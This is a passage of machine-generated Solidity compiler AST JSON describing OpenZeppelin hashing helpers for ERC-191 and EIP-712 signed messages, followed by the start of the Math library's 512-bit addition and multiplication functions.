memory"}],"id":2002,"name":"keccak256","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-8,"src":"2286:9:5","typeDescriptions":{"typeIdentifier":"t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$","typeString":"function (bytes memory) pure returns (bytes32)"}},"id":2017,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2286:107:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"functionReturnParameters":2001,"id":2018,"nodeType":"Return","src":"2267:126:5"}]},"documentation":{"id":1995,"nodeType":"StructuredDocumentation","src":"1686:480:5","text":" @dev Returns the keccak256 digest of an ERC-191 signed data with version\n `0x45` (`personal_sign` messages).\n The digest is calculated by prefixing an arbitrary `message` with\n `\"\\x19Ethereum Signed Message:\\n\" + len(message)` and hashing the result. It corresponds with the\n hash signed when using the https://ethereum.org/en/developers/docs/apis/json-rpc/#eth_sign[`eth_sign`] JSON-RPC method.\n See {ECDSA-recover}."},"id":2020,"implemented":true,"kind":"function","modifiers":[],"name":"toEthSignedMessageHash","nameLocation":"2180:22:5","nodeType":"FunctionDefinition","parameters":{"id":1998,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1997,"mutability":"mutable","name":"message","nameLocation":"2216:7:5","nodeType":"VariableDeclaration","scope":2020,"src":"2203:20:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":1996,"name":"bytes","nodeType":"ElementaryTypeName","src":"2203:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"2202:22:5"},"returnParameters":{"id":2001,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2000,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2020,"src":"2248:7:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":1999,"name":"bytes32","nodeType":"ElementaryTypeName","src":"2248:7:5","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"2247:9:5"},"scope":2065,"src":"2171:229:5","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2039,"nodeType":"Block","src":"2854:80:5","statements":[{"expression":{"arguments":[{"arguments":[{"hexValue":"1900","id":2033,"isConstant":false,"isLValue":false,"isPure":true,"kind":"hexString","lValueRequested":false,"nodeType":"Literal","src":"2898:10:5","typeDescriptions":{"typeIdentifier":"t_stringliteral_73fd5d154550a4a103564cb191928cd38898034de1b952dc21b290898b4b697a","typeString":"literal_string hex\"1900\""},"value":"\u0019\u0000"},{"id":2034,"name":"validator","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2023,"src":"2910:9:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":2035,"name":"data","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2025,"src":"2921:4:5","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_stringliteral_73fd5d154550a4a103564cb191928cd38898034de1b952dc21b290898b4b697a","typeString":"literal_string hex\"1900\""},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"expression":{"id":2031,"name":"abi","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-1,"src":"2881:3:5","typeDescriptions":{"typeIdentifier":"t_magic_abi","typeString":"abi"}},"id":2032,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"2885:12:5","memberName":"encodePacked","nodeType":"MemberAccess","src":"2881:16:5","typeDescriptions":{"typeIdentifier":"t_function_abiencodepacked_pure$__$returns$_t_bytes_memory_ptr_$","typeString":"function () pure returns (bytes memory)"}},"id":2036,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2881:45:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":2030,"name":"keccak256","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-8,"src":"2871:9:5","typeDescriptions":{"typeIdentifier":"t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$","typeString":"function (bytes memory) pure returns (bytes32)"}},"id":2037,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2871:56:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"functionReturnParameters":2029,"id":2038,"nodeType":"Return","src":"2864:63:5"}]},"documentation":{"id":2021,"nodeType":"StructuredDocumentation","src":"2406:332:5","text":" @dev Returns the keccak256 digest of an ERC-191 signed data with version\n `0x00` (data with intended validator).\n The digest is calculated by prefixing an arbitrary `data` with `\"\\x19\\x00\"` and the intended\n `validator` address. Then hashing the result.\n See {ECDSA-recover}."},"id":2040,"implemented":true,"kind":"function","modifiers":[],"name":"toDataWithIntendedValidatorHash","nameLocation":"2752:31:5","nodeType":"FunctionDefinition","parameters":{"id":2026,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2023,"mutability":"mutable","name":"validator","nameLocation":"2792:9:5","nodeType":"VariableDeclaration","scope":2040,"src":"2784:17:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2022,"name":"address","nodeType":"ElementaryTypeName","src":"2784:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2025,"mutability":"mutable","name":"data","nameLocation":"2816:4:5","nodeType":"VariableDeclaration","scope":2040,"src":"2803:17:5","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":2024,"name":"bytes","nodeType":"ElementaryTypeName","src":"2803:5:5","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"src":"2783:38:5"},"returnParameters":{"id":2029,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2028,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":2040,"src":"2845:7:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":2027,"name":"bytes32","nodeType":"ElementaryTypeName","src":"2845:7:5","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"2844:9:5"},"scope":2065,"src":"2743:191:5","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2051,"nodeType":"Block","src":"3216:216:5","statements":[{"AST":{"nativeSrc":"3251:175:5","nodeType":"YulBlock","src":"3251:175:5","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"3272:4:5","nodeType":"YulLiteral","src":"3272:4:5","type":"","value":"0x00"},{"hexValue":"1900","kind":"string","nativeSrc":"3278:10:5","nodeType":"YulLiteral","src":"3278:10:5","type":"","value":"\u0019\u0000"}],"functionName":{"name":"mstore","nativeSrc":"3265:6:5","nodeType":"YulIdentifier","src":"3265:6:5"},"nativeSrc":"3265:24:5","nodeType":"YulFunctionCall","src":"3265:24:5"},"nativeSrc":"3265:24:5","nodeType":"YulExpressionStatement","src":"3265:24:5"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"3309:4:5","nodeType":"YulLiteral","src":"3309:4:5","type":"","value":"0x02"},{"arguments":[{"kind":"number","nativeSrc":"3319:2:5","nodeType":"YulLiteral","src":"3319:2:5","type":"","value":"96"},{"name":"validator","nativeSrc":"3323:9:5","nodeType":"YulIdentifier","src":"3323:9:5"}],"functionName":{"name":"shl","nativeSrc":"3315:3:5","nodeType":"YulIdentifier","src":"3315:3:5"},"nativeSrc":"3315:18:5","nodeType":"YulFunctionCall","src":"3315:18:5"}],"functionName":{"name":"mstore","nativeSrc":"3302:6:5","nodeType":"YulIdentifier","src":"3302:6:5"},"nativeSrc":"3302:32:5","nodeType":"YulFunctionCall","src":"3302:32:5"},"nativeSrc":"3302:32:5","nodeType":"YulExpressionStatement","src":"3302:32:5"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"3354:4:5","nodeType":"YulLiteral","src":"3354:4:5","type":"","value":"0x16"},{"name":"messageHash","nativeSrc":"3360:11:5","nodeType":"YulIdentifier","src":"3360:11:5"}],"functionName":{"name":"mstore","nativeSrc":"3347:6:5","nodeType":"YulIdentifier","src":"3347:6:5"},"nativeSrc":"3347:25:5","nodeType":"YulFunctionCall","src":"3347:25:5"},"nativeSrc":"3347:25:5","nodeType":"YulExpressionStatement","src":"3347:25:5"},{"nativeSrc":"3385:31:5","nodeType":"YulAssignment","src":"3385:31:5","value":{"arguments":[{"kind":"number","nativeSrc":"3405:4:5","nodeType":"YulLiteral","src":"3405:4:5","type":"","value":"0x00"},{"kind":"number","nativeSrc":"3411:4:5","nodeType":"YulLiteral","src":"3411:4:5","type":"","value":"0x36"}],"functionName":{"name":"keccak256","nativeSrc":"3395:9:5","nodeType":"YulIdentifier","src":"3395:9:5"},"nativeSrc":"3395:21:5","nodeType":"YulFunctionCall","src":"3395:21:5"},"variableNames":[{"name":"digest","nativeSrc":"3385:6:5","nodeType":"YulIdentifier","src":"3385:6:5"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":2048,"isOffset":false,"isSlot":false,"src":"3385:6:5","valueSize":1},{"declaration":2045,"isOffset":false,"isSlot":false,"src":"3360:11:5","valueSize":1},{"declaration":2043,"isOffset":false,"isSlot":false,"src":"3323:9:5","valueSize":1}],"flags":["memory-safe"],"id":2050,"nodeType":"InlineAssembly","src":"3226:200:5"}]},"documentation":{"id":2041,"nodeType":"StructuredDocumentation","src":"2940:129:5","text":" @dev Variant of {toDataWithIntendedValidatorHash-address-bytes} optimized for cases where `data` is a bytes32."},"id":2052,"implemented":true,"kind":"function","modifiers":[],"name":"toDataWithIntendedValidatorHash","nameLocation":"3083:31:5","nodeType":"FunctionDefinition","parameters":{"id":2046,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2043,"mutability":"mutable","name":"validator","nameLocation":"3132:9:5","nodeType":"VariableDeclaration","scope":2052,"src":"3124:17:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":2042,"name":"address","nodeType":"ElementaryTypeName","src":"3124:7:5","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":2045,"mutability":"mutable","name":"messageHash","nameLocation":"3159:11:5","nodeType":"VariableDeclaration","scope":2052,"src":"3151:19:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":2044,"name":"bytes32","nodeType":"ElementaryTypeName","src":"3151:7:5","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"3114:62:5"},"returnParameters":{"id":2049,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2048,"mutability":"mutable","name":"digest","nameLocation":"3208:6:5","nodeType":"VariableDeclaration","scope":2052,"src":"3200:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":2047,"name":"bytes32","nodeType":"ElementaryTypeName","src":"3200:7:5","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"3199:16:5"},"scope":2065,"src":"3074:358:5","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2063,"nodeType":"Block","src":"3983:265:5","statements":[{"AST":{"nativeSrc":"4018:224:5","nodeType":"YulBlock","src":"4018:224:5","statements":[{"nativeSrc":"4032:22:5","nodeType":"YulVariableDeclaration","src":"4032:22:5","value":{"arguments":[{"kind":"number","nativeSrc":"4049:4:5","nodeType":"YulLiteral","src":"4049:4:5","type":"","value":"0x40"}],"functionName":{"name":"mload","nativeSrc":"4043:5:5","nodeType":"YulIdentifier","src":"4043:5:5"},"nativeSrc":"4043:11:5","nodeType":"YulFunctionCall","src":"4043:11:5"},"variables":[{"name":"ptr","nativeSrc":"4036:3:5","nodeType":"YulTypedName","src":"4036:3:5","type":""}]},{"expression":{"arguments":[{"name":"ptr","nativeSrc":"4074:3:5","nodeType":"YulIdentifier","src":"4074:3:5"},{"hexValue":"1901","kind":"string","nativeSrc":"4079:10:5","nodeType":"YulLiteral","src":"4079:10:5","type":"","value":"\u0019\u0001"}],"functionName":{"name":"mstore","nativeSrc":"4067:6:5","nodeType":"YulIdentifier","src":"4067:6:5"},"nativeSrc":"4067:23:5","nodeType":"YulFunctionCall","src":"4067:23:5"},"nativeSrc":"4067:23:5","nodeType":"YulExpressionStatement","src":"4067:23:5"},{"expression":{"arguments":[{"arguments":[{"name":"ptr","nativeSrc":"4114:3:5","nodeType":"YulIdentifier","src":"4114:3:5"},{"kind":"number","nativeSrc":"4119:4:5","nodeType":"YulLiteral","src":"4119:4:5","type":"","value":"0x02"}],"functionName":{"name":"add","nativeSrc":"4110:3:5","nodeType":"YulIdentifier","src":"4110:3:5"},"nativeSrc":"4110:14:5","nodeType":"YulFunctionCall","src":"4110:14:5"},{"name":"domainSeparator","nativeSrc":"4126:15:5","nodeType":"YulIdentifier","src":"4126:15:5"}],"functionName":{"name":"mstore","nativeSrc":"4103:6:5","nodeType":"YulIdentifier","src":"4103:6:5"},"nativeSrc":"4103:39:5","nodeType":"YulFunctionCall","src":"4103:39:5"},"nativeSrc":"4103:39:5","nodeType":"YulExpressionStatement","src":"4103:39:5"},{"expression":{"arguments":[{"arguments":[{"name":"ptr","nativeSrc":"4166:3:5","nodeType":"YulIdentifier","src":"4166:3:5"},{"kind":"number","nativeSrc":"4171:4:5","nodeType":"YulLiteral","src":"4171:4:5","type":"","value":"0x22"}],"functionName":{"name":"add","nativeSrc":"4162:3:5","nodeType":"YulIdentifier","src":"4162:3:5"},"nativeSrc":"4162:14:5","nodeType":"YulFunctionCall","src":"4162:14:5"},{"name":"structHash","nativeSrc":"4178:10:5","nodeType":"YulIdentifier","src":"4178:10:5"}],"functionName":{"name":"mstore","nativeSrc":"4155:6:5","nodeType":"YulIdentifier","src":"4155:6:5"},"nativeSrc":"4155:34:5","nodeType":"YulFunctionCall","src":"4155:34:5"},"nativeSrc":"4155:34:5","nodeType":"YulExpressionStatement","src":"4155:34:5"},{"nativeSrc":"4202:30:5","nodeType":"YulAssignment","src":"4202:30:5","value":{"arguments":[{"name":"ptr","nativeSrc":"4222:3:5","nodeType":"YulIdentifier","src":"4222:3:5"},{"kind":"number","nativeSrc":"4227:4:5","nodeType":"YulLiteral","src":"4227:4:5","type":"","value":"0x42"}],"functionName":{"name":"keccak256","nativeSrc":"4212:9:5","nodeType":"YulIdentifier","src":"4212:9:5"},"nativeSrc":"4212:20:5","nodeType":"YulFunctionCall","src":"4212:20:5"},"variableNames":[{"name":"digest","nativeSrc":"4202:6:5","nodeType":"YulIdentifier","src":"4202:6:5"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":2060,"isOffset":false,"isSlot":false,"src":"4202:6:5","valueSize":1},{"declaration":2055,"isOffset":false,"isSlot":false,"src":"4126:15:5","valueSize":1},{"declaration":2057,"isOffset":false,"isSlot":false,"src":"4178:10:5","valueSize":1}],"flags":["memory-safe"],"id":2062,"nodeType":"InlineAssembly","src":"3993:249:5"}]},"documentation":{"id":2053,"nodeType":"StructuredDocumentation","src":"3438:431:5","text":" @dev Returns the keccak256 digest of an EIP-712 typed data (ERC-191 version `0x01`).\n The digest is calculated from a `domainSeparator` and a `structHash`, by prefixing them with\n `\\x19\\x01` and hashing the result. It corresponds to the hash signed by the\n https://eips.ethereum.org/EIPS/eip-712[`eth_signTypedData`] JSON-RPC method as part of EIP-712.\n See {ECDSA-recover}."},"id":2064,"implemented":true,"kind":"function","modifiers":[],"name":"toTypedDataHash","nameLocation":"3883:15:5","nodeType":"FunctionDefinition","parameters":{"id":2058,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2055,"mutability":"mutable","name":"domainSeparator","nameLocation":"3907:15:5","nodeType":"VariableDeclaration","scope":2064,"src":"3899:23:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":2054,"name":"bytes32","nodeType":"ElementaryTypeName","src":"3899:7:5","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"},{"constant":false,"id":2057,"mutability":"mutable","name":"structHash","nameLocation":"3932:10:5","nodeType":"VariableDeclaration","scope":2064,"src":"3924:18:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":2056,"name":"bytes32","nodeType":"ElementaryTypeName","src":"3924:7:5","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"3898:45:5"},"returnParameters":{"id":2061,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2060,"mutability":"mutable","name":"digest","nameLocation":"3975:6:5","nodeType":"VariableDeclaration","scope":2064,"src":"3967:14:5","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"typeName":{"id":2059,"name":"bytes32","nodeType":"ElementaryTypeName","src":"3967:7:5","typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"visibility":"internal"}],"src":"3966:16:5"},"scope":2065,"src":"3874:374:5","stateMutability":"pure","virtual":false,"visibility":"internal"}],"scope":2066,"src":"521:3729:5","usedErrors":[],"usedEvents":[]}],"src":"123:4128:5"},"id":5},"@openzeppelin/contracts/utils/math/Math.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/utils/math/Math.sol","exportedSymbols":{"Math":[3686],"Panic":[229],"SafeCast":[5451]},"id":3687,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":2067,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"103:24:6"},{"absolutePath":"@openzeppelin/contracts/utils/Panic.sol","file":"../Panic.sol","id":2069,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":3687,"sourceUnit":230,"src":"129:35:6","symbolAliases":[{"foreign":{"id":2068,"name":"Panic","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":229,"src":"137:5:6","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/math/SafeCast.sol","file":"./SafeCast.sol","id":2071,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":3687,"sourceUnit":5452,"src":"165:40:6","symbolAliases":[{"foreign":{"id":2070,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"173:8:6","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"abstract":false,"baseContracts":[],"canonicalName":"Math","contractDependencies":[],"contractKind":"library","documentation":{"id":2072,"nodeType":"StructuredDocumentation","src":"207:73:6","text":" @dev Standard math utilities missing in the Solidity language."},"fullyImplemented":true,"id":3686,"linearizedBaseContracts":[3686],"name":"Math","nameLocation":"289:4:6","nodeType":"ContractDefinition","nodes":[{"canonicalName":"Math.Rounding","id":2077,"members":[{"id":2073,"name":"Floor","nameLocation":"324:5:6","nodeType":"EnumValue","src":"324:5:6"},{"id":2074,"name":"Ceil","nameLocation":"367:4:6","nodeType":"EnumValue","src":"367:4:6"},{"id":2075,"name":"Trunc","nameLocation":"409:5:6","nodeType":"EnumValue","src":"409:5:6"},{"id":2076,"name":"Expand","nameLocation":"439:6:6","nodeType":"EnumValue","src":"439:6:6"}],"name":"Rounding","nameLocation":"305:8:6","nodeType":"EnumDefinition","src":"300:169:6"},{"body":{"id":2090,"nodeType":"Block","src":"731:112:6","statements":[{"AST":{"nativeSrc":"766:71:6","nodeType":"YulBlock","src":"766:71:6","statements":[{"nativeSrc":"780:16:6","nodeType":"YulAssignment","src":"780:16:6","value":{"arguments":[{"name":"a","nativeSrc":"791:1:6","nodeType":"YulIdentifier","src":"791:1:6"},{"name":"b","nativeSrc":"794:1:6","nodeType":"YulIdentifier","src":"794:1:6"}],"functionName":{"name":"add","nativeSrc":"787:3:6","nodeType":"YulIdentifier","src":"787:3:6"},"nativeSrc":"787:9:6","nodeType":"YulFunctionCall","src":"787:9:6"},"variableNames":[{"name":"low","nativeSrc":"780:3:6","nodeType":"YulIdentifier","src":"780:3:6"}]},{"nativeSrc":"809:18:6","nodeType":"YulAssignment","src":"809:18:6","value":{"arguments":[{"name":"low","nativeSrc":"820:3:6","nodeType":"YulIdentifier","src":"820:3:6"},{"name":"a","nativeSrc":"825:1:6","nodeType":"YulIdentifier","src":"825:1:6"}],"functionName":{"name":"lt","nativeSrc":"817:2:6","nodeType":"YulIdentifier","src":"817:2:6"},"nativeSrc":"817:10:6","nodeType":"YulFunctionCall","src":"817:10:6"},"variableNames":[{"name":"high","nativeSrc":"809:4:6","nodeType":"YulIdentifier","src":"809:4:6"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":2080,"isOffset":false,"isSlot":false,"src":"791:1:6","valueSize":1},{"declaration":2080,"isOffset":false,"isSlot":false,"src":"825:1:6","valueSize":1},{"declaration":2082,"isOffset":false,"isSlot":false,"src":"794:1:6","valueSize":1},{"declaration":2085,"isOffset":false,"isSlot":false,"src":"809:4:6","valueSize":1},{"declaration":2087,"isOffset":false,"isSlot":false,"src":"780:3:6","valueSize":1},{"declaration":2087,"isOffset":false,"isSlot":false,"src":"820:3:6","valueSize":1}],"flags":["memory-safe"],"id":2089,"nodeType":"InlineAssembly","src":"741:96:6"}]},"documentation":{"id":2078,"nodeType":"StructuredDocumentation","src":"475:163:6","text":" @dev Return the 512-bit addition of two uint256.\n The result is stored in two 256 variables such that sum = high * 2²⁵⁶ + low."},"id":2091,"implemented":true,"kind":"function","modifiers":[],"name":"add512","nameLocation":"652:6:6","nodeType":"FunctionDefinition","parameters":{"id":2083,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2080,"mutability":"mutable","name":"a","nameLocation":"667:1:6","nodeType":"VariableDeclaration","scope":2091,"src":"659:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2079,"name":"uint256","nodeType":"ElementaryTypeName","src":"659:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2082,"mutability":"mutable","name":"b","nameLocation":"678:1:6","nodeType":"VariableDeclaration","scope":2091,"src":"670:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2081,"name":"uint256","nodeType":"ElementaryTypeName","src":"670:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"658:22:6"},"returnParameters":{"id":2088,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2085,"mutability":"mutable","name":"high","nameLocation":"712:4:6","nodeType":"VariableDeclaration","scope":2091,"src":"704:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2084,"name":"uint256","nodeType":"ElementaryTypeName","src":"704:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2087,"mutability":"mutable","name":"low","nameLocation":"726:3:6","nodeType":"VariableDeclaration","scope":2091,"src":"718:11:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2086,"name":"uint256","nodeType":"ElementaryTypeName","src":"718:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"703:27:6"},"scope":3686,"src":"643:200:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2104,"nodeType":"Block","src":"1115:462:6","statements":[{"AST":{"nativeSrc":"1437:134:6","nodeType":"YulBlock","src":"1437:134:6","statements":[{"nativeSrc":"1451:30:6","nodeType":"YulVariableDeclaration","src":"1451:30:6","value":{"arguments":[{"name":"a","nativeSrc":"1468:1:6","nodeType":"YulIdentifier","src":"1468:1:6"},{"name":"b","nativeSrc":"1471:1:6","nodeType":"YulIdentifier","src":"1471:1:6"},{"arguments":[{"kind":"number","nativeSrc":"1478:1:6","nodeType":"YulLiteral","src":"1478:1:6","type":"","value":"0"}],"functionName":{"name":"not","nativeSrc":"1474:3:6","nodeType":"YulIdentifier","src":"1474:3:6"},"nativeSrc":"1474:6:6","nodeType":"YulFunctionCall","src":"1474:6:6"}],"functionName":{"name":"mulmod","nativeSrc":"1461:6:6","nodeType":"YulIdentifier","src":"1461:6:6"},"nativeSrc":"1461:20:6","nodeType":"YulFunctionCall","src":"1461:20:6"},"variables":[{"name":"mm","nativeSrc":"1455:2:6","nodeType":"YulTypedName","src":"1455:2:6","type":""}]},{"nativeSrc":"1494:16:6","nodeType":"YulAssignment","src":"1494:16:6","value":{"arguments":[{"name":"a","nativeSrc":"1505:1:6","nodeType":"YulIdentifier","src":"1505:1:6"},{"name":"b","nativeSrc":"1508:1:6","nodeType":"YulIdentifier","src":"1508:1:6"}],"functionName":{"name":"mul","nativeSrc":"1501:3:6","nodeType":"YulIdentifier","src":"1501:3:6"},"nativeSrc":"1501:9:6","nodeType":"YulFunctionCall","src":"1501:9:6"},"variableNames":[{"name":"low","nativeSrc":"1494:3:6","nodeType":"YulIdentifier","src":"1494:3:6"}]},{"nativeSrc":"1523:38:6","nodeType":"YulAssignment","src":"1523:38:6","value":{"arguments":[{"arguments":[{"name":"mm","nativeSrc":"1539:2:6","nodeType":"YulIdentifier","src":"1539:2:6"},{"name":"low","nativeSrc":"1543:3:6","nodeType":"YulIdentifier","src":"1543:3:6"}],"functionName":{"name":"sub","nativeSrc":"1535:3:6","nodeType":"YulIdentifier","src":"1535:3:6"},"nativeSrc":"1535:12:6","nodeType":"YulFunctionCall","src":"1535:12:6"},{"arguments":[{"name":"mm","nativeSrc":"1552:2:6","nodeType":"YulIdentifier","src":"1552:2:6"},{"name":"low","nativeSrc":"1556:3:6","nodeType":"YulIdentifier","src":"1556:3:6"}],"functionName":{"name":"lt","nativeSrc":"1549:2:6","nodeType":"YulIdentifier","src":"1549:2:6"},"nativeSrc":"1549:11:6","nodeType":"YulFunctionCall","src":"1549:11:6"}],"functionName":{"name":"sub","nativeSrc":"1531:3:6","nodeType":"YulIdentifier","src":"1531:3:6"},"nativeSrc":"1531:30:6","nodeType":"YulFunctionCall","src":"1531:30:6"},"variableNames":[{"name":"high","nativeSrc":"1523:4:6","nodeType":"YulIdentifier","src":"1523:4:6"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":2094,"isOffset":false,"isSlot":false,"src":"1468:1:6","valueSize":1},{"declaration":2094,"isOffset":false,"isSlot":false,"src":"1505:1:6","valueSize":1},{"declaration":2096,"isOffset":false,"isSlot":false,"src":"1471:1:6","valueSize":1},{"declaration":2096,"isOffset":false,"isSlot":false,"src":"1508:1:6","valueSize":1},{"declaration":2099,"isOffset":false,"isSlot":false,"src":"1523:4:6","valueSize":1},{"declaration":2101,"isOffset":false,"isSlot":false,"src":"1494:3:6","valueSize":1},{"declaration":2101,"isOffset":false,"isSlot":false,"src":"1543:3:6","valueSize":1},{"declaration":2101,"isOffset":false,"isSlot":false,"src":"1556:3:6","valueSize":1}],"flags":["memory-safe"],"id":2103,"nodeType":"InlineAssembly","src":"1412:159:6"}]},"documentation":{"id":2092,"nodeType":"StructuredDocumentation","src":"849:173:6","text":" @dev Return the 512-bit multiplication of two uint256.\n The result is stored in two 256 variables such that product = high * 2²⁵⁶ + low."},"id":2105,"implemented":true,"kind":"function","modifiers":[],"name":"mul512","nameLocation":"1036:6:6","nodeType":"FunctionDefinition","parameters":{"id":2097,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2094,"mutability":"mutable","name":"a","nameLocation":"1051:1:6","nodeType":"VariableDeclaration","scope":2105,"src":"1043:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2093,"name":"uint256","nodeType":"ElementaryTypeName","src":"1043:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2096,"mutability":"mutable","name":"b","nameLocation":"1062:1:6","nodeType":"VariableDeclaration","scope":2105,"src":"1054:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2095,"name":"uint256","nodeType":"ElementaryTypeName","src":"1054:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1042:22:6"},"returnParameters":{"id":2102,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2099,"mutability":"mutable","name":"high","nameLocation":"1096:4:6","nodeT